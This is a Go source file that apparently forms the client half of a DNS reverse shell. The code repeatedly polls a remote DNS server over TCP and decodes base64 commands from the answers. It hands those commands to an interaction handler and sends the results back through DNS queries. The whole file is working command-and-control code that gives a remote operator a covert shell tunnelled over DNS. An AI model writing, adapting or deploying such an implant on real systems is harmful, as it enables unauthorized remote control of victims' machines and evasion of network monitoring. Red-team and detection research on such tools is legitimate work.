package client

import (
	"dns-reverse-shell/main/encoder"
	"dns-reverse-shell/main/protocol"
	"fmt"
	"github.com/miekg/dns"
	"os"
)

type messageType string

const (
	POLL   messageType = "poll"
	ANSWER messageType = "answer"
	EXIT   messageType = "exit"
)

type DNSClient struct {
	address            string
	client             *dns.Client
	idleCounter        int
	messageHandler     *protocol.MessageHandler
	interactionHandler *interactionHandler
}

func NewDNSClient(address string) *DNSClient {
	client := new(dns.Client)
	client.Net = "tcp"
	msgHandler := protocol.NewMessageHandler(encoder.NewBase64Encoder(), protocol.NewSimpleMessageSplitter())
	intHandler := newInteractionHandler()
	return &DNSClient{address: address, client: client, messageHandler: msgHandler, interactionHandler: intHandler}
}

func (d DNSClient) Start() {
	for {
		d.poll()
		d.interactionHandler.sleep()
	}
}

func (d DNSClient) sendMessage(commandType messageType, message string) {
	msg := d.messageHandler.CreateQuestionMessage(string(commandType), message)
	in, _, err := d.client.Exchange(msg, d.address)
	if err != nil {
		fmt.Println(err)
	} else {
		d.handleAnswer(in)
	}
}

func (d DNSClient) handleAnswer(answerMsg *dns.Msg) {
	msg := d.messageHandler.DecodeAnswerMsg(answerMsg)
	if msg == "" {
		return
	}
	fmt.Println(msg)
	d.interactionHandler.handleCommand(msg, d.exitCallback, d.answerCallback)
}

func (d DNSClient) poll() {
	d.sendMessage(POLL, "poll")
}

func (d DNSClient) answerCallback(message string) {
	d.sendMessage(ANSWER, message)
}

func (d DNSClient) exitCallback() {
	d.sendMessage(EXIT, "exit")
	os.Exit(0)
}
